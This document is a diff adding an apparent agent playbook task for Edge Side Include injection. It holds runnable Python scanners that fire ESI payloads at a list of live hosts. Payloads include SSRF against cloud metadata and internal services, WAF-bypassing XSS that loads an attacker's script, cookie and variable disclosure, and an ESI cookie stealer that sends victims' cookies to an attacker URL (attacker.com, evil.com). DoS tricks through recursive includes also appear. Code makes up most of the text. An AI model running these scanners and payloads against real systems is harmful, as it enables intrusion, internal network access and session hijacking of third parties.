@@ -1,0 +1,901 @@
+================================================================================
+TASK 86 - ESI INJECTION (Edge Side Includes)
+================================================================================
+Covers testing_toolkit.txt Phase 12 Step 41
+Server-Side Include injection at the edge/cache layer
+
+ESI = XML-like tags processed by CDNs/proxies/caches
+If you can inject ESI tags, the EDGE SERVER executes them!
+
+IMPACT:
+- SSRF through edge infrastructure
+- XSS that bypasses WAF (processed server-side)
+- Information disclosure (internal headers, env vars)
+- Cache poisoning with dynamic content
+- Credential theft via include
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts  
+outputs/cache/cache_behavior_map.txt       <- From Task 84
+temp/agent1/waf_results.txt                <- WAF info (ESI support varies)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/esi/
+    esi_detection.txt                      <- Hosts that process ESI
+    esi_vulnerable.txt                     <- Confirmed ESI injection
+    esi_ssrf_results.txt                   <- SSRF via ESI
+    esi_payloads_working.txt               <- Payloads that executed
+
+outputs/vulnerabilities/ESI-INJECTION-*-CRITICAL.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND: ESI is processed by EDGE infrastructure, not the app.
+
+    What processes ESI?
+    |
+    +-- CDNs
+    |   +-- Akamai (most common ESI support)
+    |   +-- Fastly (Varnish-based)
+    |   +-- Cloudflare (limited)
+    |
+    +-- Reverse Proxies
+    |   +-- Varnish (full ESI support)
+    |   +-- Squid (partial)
+    |   +-- Apache Traffic Server
+    |
+    +-- Load Balancers
+        +-- F5 (some models)
+        +-- Various enterprise appliances
+
+    What can ESI do? (Your attack surface)
+    |
+    +-- <esi:include src="URL"/>
+    |   +-- Fetches URL and includes content
+    |   +-- SSRF to internal services!
+    |   +-- Bypass firewall (request from edge)
+    |
+    +-- <esi:inline fragment>
+    |   +-- Include inline content conditionally
+    |   +-- XSS bypass (processed server-side)
+    |
+    +-- <esi:vars>
+    |   +-- Access ESI variables
+    |   +-- Information disclosure
+    |
+    +-- <esi:choose>/<esi:when>/<esi:otherwise>
+        +-- Conditional logic
+        +-- Business logic bypass
+
+    Where to inject ESI?
+    |
+    +-- Any reflected input that reaches cache:
+    |   +-- Query parameters reflected in page
+    |   +-- Headers reflected (X-Forwarded-Host)
+    |   +-- Error messages
+    |   +-- User-generated content
+    |
+    +-- Must be stored/processed by edge
+        +-- Cached responses
+        +-- Dynamic edge content
+
+================================================================================
+PHASE 1: ESI BASICS
+================================================================================
+
+-----------------------------------------
+1.1 ESI Syntax Reference
+-----------------------------------------
+<!-- Basic include - SSRF -->
+<esi:include src="http://internal-server/admin"/>
+
+<!-- Include with error handling -->
+<esi:include src="http://attacker.com/log" onerror="continue"/>
+
+<!-- Variable access - info disclosure -->
+<esi:vars>$(HTTP_COOKIE)</esi:vars>
+<esi:vars>$(QUERY_STRING)</esi:vars>
+<esi:vars>$(HTTP_HOST)</esi:vars>
+
+<!-- Conditional logic -->
+<esi:choose>
+  <esi:when test="$(HTTP_COOKIE{admin})=='true'">
+    <esi:include src="/admin/panel"/>
+  </esi:when>
+  <esi:otherwise>
+    Access denied
+  </esi:otherwise>
+</esi:choose>
+
+<!-- Comment (still processed!) -->
+<!--esi <esi:include src="http://evil.com"/> -->
+
+<!-- Inline fragment -->
+<esi:inline name="fragment1">
+  <script>alert('ESI XSS')</script>
+</esi:inline>
+
+-----------------------------------------
+1.2 How ESI Injection Works
+-----------------------------------------
+SCENARIO:
+1. App reflects user input in response
+2. Response gets cached by edge (Varnish, Akamai)
+3. Attacker injects ESI tags in input
+4. Edge server PROCESSES ESI tags
+5. Included content/variables exposed
+
+EXAMPLE:
+User search: shoes<esi:include src="http://attacker.com/"/>
+
+Response cached with ESI tag intact
+Edge processes: fetches attacker.com, includes in response
+All users see included content!
+
+================================================================================
+PHASE 2: ESI DETECTION
+================================================================================
+
+-----------------------------------------
+2.1 Detect ESI Processing
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_detect.py - Detect if target processes ESI tags
+
+Test if edge infrastructure processes ESI by:
+1. Injecting ESI tags that produce observable differences
+2. Checking for ESI-related headers
+3. Timing-based detection (include causes delay)
+"""
+
+import requests
+import time
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# ESI detection payloads
+ESI_DETECTION = [
+    # Basic detection - if processed, content appears
+    '<esi:comment text="ESIDETECT123"/>',
+    
+    # Variable that should be replaced
+    '<esi:vars>$(HTTP_HOST)</esi:vars>',
+    
+    # Debug/error that reveals processing
+    '<esi:include src="http://ESIDETECT.invalid/"/>',
+    
+    # Comment-wrapped (sometimes processed)
+    '<!--esi $(HTTP_HOST) -->',
+    
+    # Encoded variants
+    '%3Cesi:vars%3E$(HTTP_HOST)%3C/esi:vars%3E',
+    
+    # CDATA wrapped
+    '<![CDATA[<esi:include src="http://test"/>]]>',
+]
+
+def detect_esi_processing(url):
+    """Test if URL/host processes ESI"""
+    
+    results = {
+        'url': url,
+        'esi_processed': False,
+        'evidence': [],
+        'headers': {}
+    }
+    
+    # Check response headers for ESI indicators
+    try:
+        resp = requests.get(url, verify=False, timeout=10)
+        
+        for header in resp.headers:
+            h_lower = header.lower()
+            if 'esi' in h_lower or 'surrogate' in h_lower:
+                results['headers'][header] = resp.headers[header]
+        
+        # Check for Surrogate-Control (ESI capability indicator)
+        if 'Surrogate-Control' in resp.headers:
+            results['evidence'].append('Surrogate-Control header present')
+            if 'ESI' in resp.headers['Surrogate-Control']:
+                results['evidence'].append('ESI explicitly enabled in headers')
+    except:
+        pass
+    
+    # Test ESI processing via reflected content
+    # Find a reflection point first
+    test_params = ['q', 'search', 'query', 'input', 'text', 'name']
+    
+    for param in test_params:
+        for payload in ESI_DETECTION:
+            try:
+                test_url = f"{url}?{param}={payload}"
+                resp = requests.get(test_url, verify=False, timeout=15)
+                
+                # If variable was processed, we won't see raw ESI
+                if '<esi:' not in resp.text and 'esi:' in payload:
+                    # Check if variable was replaced
+                    if '$(HTTP_HOST)' not in resp.text and 'HTTP_HOST' in payload:
+                        results['esi_processed'] = True
+                        results['evidence'].append(f'ESI variable processed via {param}')
+                        return results
+                
+                # Check if our detector string is missing (processed and removed)
+                if 'ESIDETECT123' in payload and 'ESIDETECT123' not in resp.text:
+                    if 'ESIDETECT123' not in resp.text and payload not in resp.text:
+                        results['esi_processed'] = True
+                        results['evidence'].append(f'ESI comment processed via {param}')
+                        return results
+                        
+            except Exception as e:
+                pass
+    
+    return results
+
+# Scan targets
+os.makedirs('outputs/esi', exist_ok=True)
+
+esi_detected = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        print(f"[*] Testing ESI: {url}")
+        
+        result = detect_esi_processing(url)
+        
+        if result['esi_processed'] or result['headers']:
+            print(f"[+] ESI INDICATORS FOUND!")
+            print(f"    Evidence: {result['evidence']}")
+            print(f"    Headers: {result['headers']}")
+            esi_detected.append(result)
+
+with open('outputs/esi/esi_detection.txt', 'w') as f:
+    f.write("# ESI Detection Results\n\n")
+    for r in esi_detected:
+        f.write(f"URL: {r['url']}\n")
+        f.write(f"Processed: {r['esi_processed']}\n")
+        f.write(f"Evidence: {', '.join(r['evidence'])}\n")
+        f.write(f"Headers: {r['headers']}\n")
+        f.write("---\n")
+
+print(f"\n[*] Found {len(esi_detected)} hosts with ESI indicators")
+
+-----------------------------------------
+2.2 Timing-Based ESI Detection
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_timing.py - Timing-based ESI detection
+
+If ESI include causes delay, it's being processed.
+"""
+
+import requests
+import time
+
+requests.packages.urllib3.disable_warnings()
+
+def test_esi_timing(url, delay_url="http://httpbin.org/delay/5"):
+    """Test ESI processing via timing"""
+    
+    # Baseline request time
+    start = time.time()
+    try:
+        requests.get(url, verify=False, timeout=30)
+    except:
+        pass
+    baseline = time.time() - start
+    
+    print(f"[*] Baseline time: {baseline:.2f}s")
+    
+    # Request with ESI include to slow URL
+    esi_payload = f'<esi:include src="{delay_url}"/>'
+    
+    test_params = ['q', 'search', 'input']
+    
+    for param in test_params:
+        test_url = f"{url}?{param}={esi_payload}"
+        
+        start = time.time()
+        try:
+            requests.get(test_url, verify=False, timeout=30)
+        except:
+            pass
+        esi_time = time.time() - start
+        
+        print(f"[*] ESI time ({param}): {esi_time:.2f}s")
+        
+        # If significantly slower, ESI might be processed
+        if esi_time > baseline + 4:  # At least 4s slower
+            print(f"[+] TIMING INDICATES ESI PROCESSING!")
+            return True
+    
+    return False
+
+# Test targets
+with open('outputs/esi/esi_detection.txt') as f:
+    for line in f:
+        if line.startswith('URL:'):
+            url = line.replace('URL:', '').strip()
+            test_esi_timing(url)
+
+================================================================================
+PHASE 3: ESI INJECTION ATTACKS
+================================================================================
+
+-----------------------------------------
+3.1 ESI SSRF Attack
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_ssrf.py - SSRF via ESI include
+
+ESI includes are made BY THE EDGE SERVER
+= Bypass firewall
+= Access internal networks
+= Different IP source
+"""
+
+import requests
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Internal targets to try via ESI SSRF
+SSRF_TARGETS = [
+    # Cloud metadata
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/latest/user-data/',
+    'http://metadata.google.internal/computeMetadata/v1/',
+    
+    # Internal services
+    'http://localhost/',
+    'http://127.0.0.1/',
+    'http://127.0.0.1:8080/',
+    'http://127.0.0.1:3000/',
+    'http://internal/',
+    'http://admin/',
+    'http://backend/',
+    
+    # Common internal hostnames
+    'http://db/',
+    'http://redis/',
+    'http://elasticsearch/',
+    'http://rabbitmq/',
+]
+
+def test_esi_ssrf(url, ssrf_target, param='q'):
+    """Test SSRF via ESI include"""
+    
+    payload = f'<esi:include src="{ssrf_target}"/>'
+    test_url = f"{url}?{param}={payload}"
+    
+    try:
+        resp = requests.get(test_url, verify=False, timeout=15)
+        
+        # Check if internal content appeared
+        ssrf_indicators = [
+            'ami-id',           # AWS metadata
+            'instance-id',      # AWS metadata
+            'computeMetadata',  # GCP metadata
+            'root:x:0',         # /etc/passwd
+            'internal',
+            'admin',
+            'dashboard',
+        ]
+        
+        for indicator in ssrf_indicators:
+            if indicator in resp.text:
+                return {
+                    'url': url,
+                    'ssrf_target': ssrf_target,
+                    'indicator': indicator,
+                    'response_sample': resp.text[:500]
+                }
+        
+        # Even 200 OK might indicate success
+        if resp.status_code == 200 and len(resp.text) > 100:
+            return {
+                'url': url,
+                'ssrf_target': ssrf_target,
+                'indicator': 'content_included',
+                'response_sample': resp.text[:500]
+            }
+            
+    except:
+        pass
+    
+    return None
+
+# Test ESI SSRF on detected hosts
+ssrf_results = []
+
+with open('outputs/esi/esi_detection.txt') as f:
+    content = f.read()
+    
+for line in content.split('\n'):
+    if line.startswith('URL:'):
+        url = line.replace('URL:', '').strip()
+        
+        print(f"\n[*] Testing ESI SSRF: {url}")
+        
+        for ssrf_target in SSRF_TARGETS:
+            result = test_esi_ssrf(url, ssrf_target)
+            
+            if result:
+                print(f"[CRITICAL] ESI SSRF: {ssrf_target}")
+                print(f"           Indicator: {result['indicator']}")
+                ssrf_results.append(result)
+
+with open('outputs/esi/esi_ssrf_results.txt', 'w') as f:
+    for r in ssrf_results:
+        f.write(f"Target: {r['url']}\n")
+        f.write(f"SSRF To: {r['ssrf_target']}\n")
+        f.write(f"Evidence: {r['indicator']}\n")
+        f.write(f"Response:\n{r['response_sample']}\n")
+        f.write("="*60 + "\n")
+
+-----------------------------------------
+3.2 ESI XSS (WAF Bypass)
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_xss.py - XSS via ESI that bypasses WAF
+
+WAF sees: <esi:include src="..."/>
+WAF thinks: harmless XML tag
+Edge processes: fetches attacker URL
+User receives: malicious JavaScript
+
+CRITICAL: XSS via ESI bypasses client-side protections!
+"""
+
+import requests
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+def test_esi_xss(url, attacker_url, param='q'):
+    """Test XSS via ESI include"""
+    
+    # Include attacker-controlled JS
+    payloads = [
+        # Direct include of attacker JS
+        f'<esi:include src="{attacker_url}/evil.js"/>',
+        
+        # Include that returns script tag
+        f'<esi:include src="{attacker_url}/xss"/>',
+        
+        # Inline ESI with script
+        '<esi:inline name="x"><script>alert(document.domain)</script></esi:inline>',
+        
+        # ESI in comment (sometimes processed)
+        f'<!--esi <esi:include src="{attacker_url}/xss"/> -->',
+    ]
+    
+    results = []
+    
+    for payload in payloads:
+        test_url = f"{url}?{param}={payload}"
+        
+        try:
+            resp = requests.get(test_url, verify=False, timeout=15)
+            
+            # Check if script tag appeared
+            if '<script>' in resp.text or 'alert(' in resp.text:
+                results.append({
+                    'payload': payload,
+                    'response': resp.text[:300]
+                })
+                
+        except:
+            pass
+    
+    return results
+
+# For testing, you'd use your own server that returns XSS
+# Example: attacker_url returns: <script>alert(document.domain)</script>
+
+-----------------------------------------
+3.3 ESI Variable Disclosure
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_vars.py - Information disclosure via ESI variables
+
+ESI provides variables that expose sensitive info
+"""
+
+import requests
+import re
+
+requests.packages.urllib3.disable_warnings()
+
+# ESI variables to extract
+ESI_VARIABLES = [
+    '$(HTTP_HOST)',
+    '$(HTTP_COOKIE)',
+    '$(HTTP_USER_AGENT)',
+    '$(HTTP_REFERER)',
+    '$(HTTP_ACCEPT)',
+    '$(HTTP_ACCEPT_LANGUAGE)',
+    '$(QUERY_STRING)',
+    '$(REQUEST_PATH)',
+    '$(HTTP_X_FORWARDED_FOR)',
+    '$(REMOTE_ADDR)',
+    '$(GEO{country_code})',
+    '$(GEO{city})',
+]
+
+def extract_esi_vars(url, param='q'):
+    """Try to extract ESI variables"""
+    
+    extracted = {}
+    
+    for var in ESI_VARIABLES:
+        payload = f'<esi:vars>ESIVAR{var}ESIVAR</esi:vars>'
+        test_url = f"{url}?{param}={payload}"
+        
+        try:
+            resp = requests.get(test_url, verify=False, timeout=10)
+            
+            # Check if variable was replaced
+            match = re.search(r'ESIVAR(.+?)ESIVAR', resp.text)
+            if match:
+                value = match.group(1)
+                # If value is different from variable name, it was processed
+                if value != var and '$(' not in value:
+                    extracted[var] = value
+                    print(f"[+] {var} = {value}")
+                    
+        except:
+            pass
+    
+    return extracted
+
+# Test variable extraction
+with open('outputs/esi/esi_detection.txt') as f:
+    for line in f:
+        if line.startswith('URL:'):
+            url = line.replace('URL:', '').strip()
+            
+            print(f"\n[*] Extracting ESI vars: {url}")
+            vars_found = extract_esi_vars(url)
+            
+            if vars_found:
+                with open('outputs/esi/esi_vars_leaked.txt', 'a') as out:
+                    out.write(f"URL: {url}\n")
+                    for var, val in vars_found.items():
+                        out.write(f"  {var}: {val}\n")
+                    out.write("---\n")
+
+================================================================================
+PHASE 4: ADVANCED ESI ATTACKS
+================================================================================
+
+-----------------------------------------
+4.1 ESI-Based Authentication Bypass
+-----------------------------------------
+<!-- If ESI can access cookies/headers, can forge auth -->
+
+<esi:choose>
+  <esi:when test="$(HTTP_COOKIE{role})=='admin'">
+    <!-- Admin content included even without being admin -->
+    <esi:include src="/api/admin/users"/>
+  </esi:when>
+</esi:choose>
+
+<!-- Force condition to be true -->
+<esi:assign name="force_admin" value="true"/>
+<esi:choose>
+  <esi:when test="$(force_admin)=='true'">
+    <esi:include src="/admin/panel"/>
+  </esi:when>
+</esi:choose>
+
+-----------------------------------------
+4.2 ESI DoS via Recursion
+-----------------------------------------
+<!-- Infinite include loop (careful - can crash edge) -->
+<esi:include src="/vulnerable?q=<esi:include src='/vulnerable?q=...'"/>
+
+<!-- Large file include (bandwidth amplification) -->
+<esi:include src="http://example.com/huge-file.zip"/>
+
+<!-- Multiple includes (slow down response) -->
+<esi:include src="http://slow.com/1"/>
+<esi:include src="http://slow.com/2"/>
+<esi:include src="http://slow.com/3"/>
+
+-----------------------------------------
+4.3 ESI Cookie Stealing
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+esi_cookie_steal.py - Steal cookies via ESI
+
+Inject ESI that exfiltrates victim's cookies to attacker
+"""
+
+def generate_cookie_stealer(attacker_url):
+    """Generate ESI payload to steal cookies"""
+    
+    # ESI that includes attacker URL with cookies as param
+    payload = f'<esi:include src="{attacker_url}/steal?c=$(HTTP_COOKIE)"/>'
+    
+    return payload
+
+# When victim visits page with this ESI:
+# 1. Edge processes ESI
+# 2. Makes request to attacker with victim's cookies
+# 3. Attacker logs cookies
+# 4. Session hijack!
+
+================================================================================
+PHASE 5: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+esi_full.py - Complete ESI injection scanner
+"""
+
+import os
+import json
+import requests
+import time
+import re
+
+requests.packages.urllib3.disable_warnings()
+
+class ESIScanner:
+    
+    DETECTION_PAYLOADS = [
+        '<esi:comment text="DETECT"/>',
+        '<esi:vars>$(HTTP_HOST)</esi:vars>',
+        '<!--esi DETECT -->',
+    ]
+    
+    SSRF_TARGETS = [
+        'http://169.254.169.254/latest/meta-data/',
+        'http://localhost/',
+        'http://127.0.0.1/',
+        'http://internal/',
+    ]
+    
+    VARIABLES = [
+        '$(HTTP_HOST)',
+        '$(HTTP_COOKIE)',
+        '$(QUERY_STRING)',
+        '$(REMOTE_ADDR)',
+    ]
+    
+    def __init__(self):
+        self.results = {
+            'esi_detected': [],
+            'ssrf': [],
+            'vars_leaked': [],
+            'xss': []
+        }
+        os.makedirs('outputs/esi', exist_ok=True)
+        os.makedirs('outputs/vulnerabilities', exist_ok=True)
+    
+    def detect_esi(self, url):
+        """Detect if host processes ESI"""
+        
+        # Check headers first
+        try:
+            resp = requests.get(url, verify=False, timeout=10)
+            
+            if 'Surrogate-Control' in resp.headers:
+                if 'ESI' in resp.headers['Surrogate-Control']:
+                    return True
+        except:
+            pass
+        
+        # Test processing
+        params = ['q', 'search', 'input']
+        
+        for param in params:
+            for payload in self.DETECTION_PAYLOADS:
+                try:
+                    test = f"{url}?{param}={payload}"
+                    resp = requests.get(test, verify=False, timeout=10)
+                    
+                    # If payload not in response, might be processed
+                    if payload not in resp.text and 'DETECT' not in resp.text:
+                        return True
+                        
+                except:
+                    pass
+        
+        return False
+    
+    def test_ssrf(self, url):
+        """Test SSRF via ESI"""
+        
+        ssrf_hits = []
+        
+        for target in self.SSRF_TARGETS:
+            payload = f'<esi:include src="{target}"/>'
+            
+            for param in ['q', 'search', 'input']:
+                try:
+                    test = f"{url}?{param}={payload}"
+                    resp = requests.get(test, verify=False, timeout=15)
+                    
+                    # Check for internal content
+                    indicators = ['ami-id', 'instance-id', 'localhost', 'root:']
+                    
+                    for ind in indicators:
+                        if ind in resp.text:
+                            ssrf_hits.append({
+                                'url': url,
+                                'target': target,
+                                'evidence': ind
+                            })
+                            break
+                except:
+                    pass
+        
+        return ssrf_hits
+    
+    def test_vars(self, url):
+        """Test variable disclosure"""
+        
+        leaked = {}
+        
+        for var in self.VARIABLES:
+            payload = f'<esi:vars>START{var}END</esi:vars>'
+            
+            try:
+                test = f"{url}?q={payload}"
+                resp = requests.get(test, verify=False, timeout=10)
+                
+                match = re.search(r'START(.+?)END', resp.text)
+                if match:
+                    val = match.group(1)
+                    if val != var and '$(' not in val:
+                        leaked[var] = val
+            except:
+                pass
+        
+        return leaked
+    
+    def generate_report(self, finding, vuln_type):
+        """Generate vulnerability report"""
+        
+        import hashlib
+        vuln_id = hashlib.md5(str(finding).encode()).hexdigest()[:8]
+        
+        report = f"""# ESI Injection - {vuln_type}
+
+**Severity**: CRITICAL
+**URL**: {finding.get('url', 'N/A')}
+
+## Description
+Edge Side Include (ESI) injection allows attackers to:
+- Execute SSRF from edge infrastructure
+- Bypass WAF with XSS payloads
+- Steal user cookies and session data
+- Access internal services
+
+## Finding
+{json.dumps(finding, indent=2)}
+
+## Impact
+- Internal network access via SSRF
+- Data exfiltration
+- Session hijacking
+- WAF bypass for XSS
+"""
+        
+        with open(f"outputs/vulnerabilities/ESI-INJECTION-{vuln_id}-CRITICAL.md", 'w') as f:
+            f.write(report)
+    
+    def scan(self, urls_file):
+        """Full ESI scan"""
+        
+        with open(urls_file) as f:
+            urls = [l.strip() for l in f if l.strip()]
+        
+        print(f"[*] Scanning {len(urls)} URLs for ESI injection...")
+        
+        for url in urls:
+            print(f"\n[*] Testing: {url}")
+            
+            # Detect ESI processing
+            if self.detect_esi(url):
+                print(f"[+] ESI processing detected!")
+                self.results['esi_detected'].append(url)
+                
+                # Test SSRF
+                ssrf = self.test_ssrf(url)
+                if ssrf:
+                    print(f"[CRITICAL] ESI SSRF found!")
+                    self.results['ssrf'].extend(ssrf)
+                    for s in ssrf:
+                        self.generate_report(s, 'SSRF')
+                
+                # Test variable leak
+                leaked = self.test_vars(url)
+                if leaked:
+                    print(f"[+] ESI vars leaked: {list(leaked.keys())}")
+                    self.results['vars_leaked'].append({
+                        'url': url,
+                        'variables': leaked
+                    })
+        
+        return self.results
+    
+    def save(self):
+        """Save results"""
+        
+        with open('outputs/esi/esi_scan_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        with open('outputs/esi/esi_vulnerable.txt', 'w') as f:
+            for url in self.results['esi_detected']:
+                f.write(f"{url}\n")
+        
+        with open('outputs/esi/esi_ssrf_results.txt', 'w') as f:
+            for r in self.results['ssrf']:
+                f.write(f"{r['url']}|{r['target']}|{r['evidence']}\n")
+
+# Run
+if __name__ == "__main__":
+    scanner = ESIScanner()
+    scanner.scan('outputs/live_base_urls.txt')
+    scanner.save()
+    
+    print(f"\n{'='*60}")
+    print(f"[*] ESI detected: {len(scanner.results['esi_detected'])}")
+    print(f"[*] SSRF hits: {len(scanner.results['ssrf'])}")
+    print(f"[*] Var leaks: {len(scanner.results['vars_leaked'])}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] ESI processing detected via header analysis
+[ ] ESI processing verified via payload testing
+[ ] Timing-based detection attempted
+[ ] SSRF via ESI include tested
+[ ] Variable disclosure tested
+[ ] XSS via ESI attempted
+[ ] Vulnerability reports generated
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+ESI TAGS:
+- <esi:include> - SSRF, content inclusion
+- <esi:vars> - Variable disclosure
+- <esi:choose> - Logic manipulation
+- <esi:inline> - XSS
+- <!--esi --> - Comment-wrapped (often processed)
+
+INDICATORS OF ESI:
+- Surrogate-Control header
+- X-ESI header
+- Varnish/Akamai/Fastly in Via header
+- Response timing differences
+
+SEVERITY: CRITICAL
+- SSRF from trusted edge infrastructure
+- WAF bypass capabilities
+- Cookie/session theft
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 87: Cloud Metadata SSRF (infrastructure phase)
